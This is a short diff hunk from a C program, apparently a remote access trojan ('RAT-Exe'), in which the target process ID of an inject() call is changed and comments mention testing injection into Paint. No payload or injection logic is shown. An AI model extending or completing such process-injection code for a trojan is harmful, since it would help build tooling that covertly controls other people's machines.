@@ -37,7 +37,7 @@ INT main()
     
     // lets just test inject first to get that working 
         // paint inject test 
-    status = inject(2592, fileSize, fileBytes);
+    status = inject(6732, fileSize, fileBytes);
     if (status != ERROR_SUCCESS)
     {
         sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
